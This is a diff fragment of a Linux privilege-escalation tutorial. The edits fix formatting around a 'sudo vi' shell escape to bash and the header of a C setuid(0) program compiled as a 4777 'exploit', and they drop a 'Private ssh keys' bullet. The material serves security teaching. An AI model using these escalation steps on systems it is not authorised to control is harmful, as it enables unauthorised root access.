@@ -15,7 +15,7 @@ In this chapter I am going to go over these common Linux privilege escalation te
 - Bad path configuration
 - Cronjobs
 - Unmounted filesystems
-- Private ssh keys
+
 
 
 
@@ -294,7 +294,7 @@ sudo vi
 
 :set shell=/bin/bash:shell    
 :!bash
-``
+```
 
 [How I got root with sudo/](https://www.securusglobal.com/community/2014/03/17/how-i-got-root-with-sudo/)
 
@@ -380,14 +380,11 @@ chmod 4777 exploit
 ```
 
 ```c
-#include
-#include
-#include
-#include
-<stdio.h>
-<stdlib.h>
-<sys/types.h>
-<unistd.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <sys/types.h>
+#include <unistd.h>
+
 int main()
 {
     setuid(0);
